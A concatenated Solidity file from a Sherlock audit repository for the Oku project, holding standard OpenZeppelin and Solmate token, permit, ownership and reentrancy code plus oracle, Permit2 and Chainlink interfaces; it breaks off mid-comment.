// SPDX-License-Identifier: MIT
// Real audited Oku source, concatenated verbatim (imports/SPDX/pragma stripped)
// from sherlock-audit/2024-11-oku @ ee3f781a73d65e33fb452c9a44eb1337c5cfdbd6.
// Contract LOGIC is unmodified — only file-scope import/pragma/SPDX lines removed.
pragma solidity ^0.8.20;

// ============ interfaces/openzeppelin/Context.sol ============
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// ============ interfaces/openzeppelin/IERC20.sol ============
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)


/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// ============ interfaces/openzeppelin/IERC20Permit.sol ============
// OpenZeppelin Contracts (last updated v4.9.4) (token/ERC20/extensions/IERC20Permit.sol)


/**
 * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
 * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
 *
 * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
 * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
 * need to send a transaction, and thus is not required to hold Ether at all.
 *
 * ==== Security Considerations
 *
 * There are two important considerations concerning the use of `permit`. The first is that a valid permit signature
 * expresses an allowance, and it should not be assumed to convey additional meaning. In particular, it should not be
 * considered as an intention to spend the allowance in any specific way. The second is that because permits have
 * built-in replay protection and can be submitted by anyone, they can be frontrun. A protocol that uses permits should
 * take this into consideration and allow a `permit` call to fail. Combining these two aspects, a pattern that may be
 * generally recommended is:
 *
 * ```solidity
 * function doThingWithPermit(..., uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public {
 *     try token.permit(msg.sender, address(this), value, deadline, v, r, s) {} catch {}
 *     doThing(..., value);
 * }
 *
 * function doThing(..., uint256 value) public {
 *     token.safeTransferFrom(msg.sender, address(this), value);
 *     ...
 * }
 * ```
 *
 * Observe that: 1) `msg.sender` is used as the owner, leaving no ambiguity as to the signer intent, and 2) the use of
 * `try/catch` allows the permit to fail and makes the code tolerant to frontrunning. (See also
 * {SafeERC20-safeTransferFrom}).
 *
 * Additionally, note that smart contract wallets (such as Argent or Safe) are not able to produce permit signatures, so
 * contracts should have entry points that don't rely on permit.
 */
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     *
     * CAUTION: See Security Considerations above.
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}


// ============ interfaces/openzeppelin/Address.sol ============
// OpenZeppelin Contracts (last updated v4.9.0) (utils/Address.sol)


/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     *
     * Furthermore, `isContract` will also return true if the target contract within
     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,
     * which only has an effect at the end of a transaction.
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}


// ============ interfaces/openzeppelin/SafeERC20.sol ============
// OpenZeppelin Contracts (last updated v4.9.3) (token/ERC20/utils/SafeERC20.sol)



/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    /**
     * @dev Transfer `value` amount of `token` from the calling contract to `to`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    /**
     * @dev Transfer `value` amount of `token` from `from` to `to`, spending the approval given by `from` to the
     * calling contract. If `token` returns no value, non-reverting calls are assumed to be successful.
     */
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    /**
     * @dev Increase the calling contract's allowance toward `spender` by `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, oldAllowance + value));
    }

    /**
     * @dev Decrease the calling contract's allowance toward `spender` by `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, oldAllowance - value));
        }
    }

    /**
     * @dev Set the calling contract's allowance toward `spender` to `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful. Meant to be used with tokens that require the approval
     * to be set to zero before setting it to a non-zero value, such as USDT.
     */
    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        bytes memory approvalCall = abi.encodeWithSelector(token.approve.selector, spender, value);

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
            _callOptionalReturn(token, approvalCall);
        }
    }

    /**
     * @dev Use a ERC-2612 signature to set the `owner` approval toward `spender` on `token`.
     * Revert on invalid signature.
     */
    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        require(returndata.length == 0 || abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     *
     * This is a variant of {_callOptionalReturn} that silents catches all reverts and returns a bool instead.
     */
    function _callOptionalReturnBool(IERC20 token, bytes memory data) private returns (bool) {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We cannot use {Address-functionCall} here since this should return false
        // and not revert is the subcall reverts.

        (bool success, bytes memory returndata) = address(token).call(data);
        return
            success && (returndata.length == 0 || abi.decode(returndata, (bool))) && Address.isContract(address(token));
    }
}


// ============ interfaces/openzeppelin/Ownable.sol ============
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// ============ interfaces/openzeppelin/ReentrancyGuard.sol ============
// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)


/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If EIP-1153 (transient storage) is available on the chain you're deploying at,
 * consider using {ReentrancyGuardTransient} instead.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private _status;

    /**
     * @dev Unauthorized reentrant call.
     */
    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        _status = ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }
}

// ============ interfaces/openzeppelin/ERC20.sol ============

/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.
/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)
/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)
/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.
abstract contract ERC20 {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(address indexed owner, address indexed spender, uint256 amount);

    /*//////////////////////////////////////////////////////////////
                            METADATA STORAGE
    //////////////////////////////////////////////////////////////*/

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    /*//////////////////////////////////////////////////////////////
                              ERC20 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    /*//////////////////////////////////////////////////////////////
                            EIP-2612 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 internal immutable INITIAL_CHAIN_ID;

    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;

    mapping(address => uint256) public nonces;

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;

        INITIAL_CHAIN_ID = block.chainid;
        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
    }

    /*//////////////////////////////////////////////////////////////
                               ERC20 LOGIC
    //////////////////////////////////////////////////////////////*/

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[msg.sender] -= amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(msg.sender, to, amount);

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(from, to, amount);

        return true;
    }

    /*//////////////////////////////////////////////////////////////
                             EIP-2612 LOGIC
    //////////////////////////////////////////////////////////////*/

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");

        // Unchecked because the only math done is incrementing
        // the owner's nonce which cannot realistically overflow.
        unchecked {
            address recoveredAddress = ecrecover(
                keccak256(
                    abi.encodePacked(
                        "\x19\x01",
                        DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                keccak256(
                                    "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
                                ),
                                owner,
                                spender,
                                value,
                                nonces[owner]++,
                                deadline
                            )
                        )
                    )
                ),
                v,
                r,
                s
            );

            require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");

            allowance[recoveredAddress][spender] = value;
        }

        emit Approval(owner, spender, value);
    }

    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
    }

    function computeDomainSeparator() internal view virtual returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                    keccak256(bytes(name)),
                    keccak256("1"),
                    block.chainid,
                    address(this)
                )
            );
    }

    /*//////////////////////////////////////////////////////////////
                        INTERNAL MINT/BURN LOGIC
    //////////////////////////////////////////////////////////////*/

    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal virtual {
        balanceOf[from] -= amount;

        // Cannot underflow because a user's balance
        // will never be larger than the total supply.
        unchecked {
            totalSupply -= amount;
        }

        emit Transfer(from, address(0), amount);
    }
}


// ============ oracle/IOracleRelay.sol ============

/// @title OracleRelay Interface
interface IOracleRelay {
  function underlying() external view returns (address);
  function currentValue() external view returns (uint256 price);
}


// ============ oracle/IPythRelay.sol ============

/// @title OracleRelay Interface
interface IPythRelay is IOracleRelay {
  function updatePrice(bytes[] calldata priceUpdate) external payable returns (uint256 updatedPrice);
  function getUpdateFee(bytes[] calldata priceUpdate) external view returns (uint fee);
}


// ============ interfaces/uniswapV3/IPermit2.sol ============

interface IPermit2 {
    /// @notice The token and amount details for a transfer signed in the permit transfer signature
    struct TokenPermissions {
        // ERC20 token address
        address token;
        // the maximum amount that can be spent
        uint256 amount;
    }

    /// @notice The signed permit message for a single token transfer
    struct PermitTransferFrom {
        TokenPermissions permitted;
        // a unique value for every token owner's signature to prevent signature replays
        uint256 nonce;
        // deadline on the permit signature
        uint256 deadline;
    }

    /// @notice Specifies the recipient address and amount for batched transfers.
    /// @dev Recipients and amounts correspond to the index of the signed token permissions array.
    /// @dev Reverts if the requested amount is greater than the permitted signed amount.
    struct SignatureTransferDetails {
        // recipient address
        address to;
        // spender requested amount
        uint256 requestedAmount;
    }

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    /// @notice A mapping from owner address to token address to spender address to PackedAllowance struct, which contains details and conditions of the approval.
    /// @notice The mapping is indexed in the above order see: allowance[ownerAddress][tokenAddress][spenderAddress]
    /// @dev The packed slot holds the allowed amount, expiration at which the allowed amount is no longer valid, and current nonce thats updated on any signature based approvals.
    function allowance(
        address,
        address,
        address
    ) external view returns (uint160, uint48, uint48);

    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;

    /// @notice Transfers a token using a signed permit message
    /// @dev Reverts if the requested amount is greater than the permitted signed amount
    /// @param permit The permit data signed over by the owner
    /// @param owner The owner of the tokens to transfer
    /// @param transferDetails The spender's requested transfer details for the permitted token
    /// @param signature The signature to verify
    function permitTransferFrom(
        PermitTransferFrom memory permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;

    /// @notice The permit data for a token
    struct PermitDetails {
        // ERC20 token address
        address token;
        // the maximum amount allowed to spend
        uint160 amount;
        // timestamp at which a spender's token allowances become invalid
        uint48 expiration;
        // an incrementing value indexed per owner,token,and spender for each signature
        uint48 nonce;
    }

    /// @notice The permit message signed for a single token allownce
    struct PermitSingle {
        // the permit data for a single token alownce
        PermitDetails details;
        // address permissioned on the allowed tokens
        address spender;
        // deadline on the permit signature
        uint256 sigDeadline;
    }

    /// @notice Permit a spender to a given amount of the owners token via the owner's EIP-712 signature
    /// @dev May fail if the owner's nonce was invalidated in-flight by invalidateNonce
    /// @param owner The owner of the tokens being approved
    /// @param permitSingle Data signed over by the owner specifying the terms of approval
    /// @param signature The owner's signature over the permit data
    function permit(
        address owner,
        PermitSingle memory permitSingle,
        bytes calldata signature
    ) external;
}

// ============ interfaces/chainlink/AutomationCompatibleInterface.sol ============

interface AutomationCompatibleInterface {
  /**
   * @notice method that is simulated by the keepers to see if any work actually
   * needs to be performed. This method does does not actually need to be
   * executable, and since it is only ever simulated it can consume lots of gas.
   * @dev To ensure that it is never called, you may want to add the
   * cannotExecute modifier from KeeperBase to your implementation of this
   * method.
   * @param checkData specified in the upkeep registration so it is always the
   * same for a registered upkeep. This can easily be broken down into specific
   * arguments using `abi.decode`, so multiple upkeeps can be registered on the
   * same contract and easily differentiated by the contract.
   * @return upkeepNeeded boolean to indicate whether the keeper should call
   * performUpkeep or not.
   * @return performData bytes that the keeper should call performUpkeep with, if
   * upkeep is needed. If you would like to encode data to decode later, try
   * `abi.encode`.
   */
  function checkUpkeep(bytes calldata checkData) external view returns (bool upkeepNeeded, bytes memory performData);

  /**
   * @notice method that is actually executed by the keepers, via the registry.
   * The data returned by the checkUpkeep simulation will be passed into
   * this method to actually be executed.
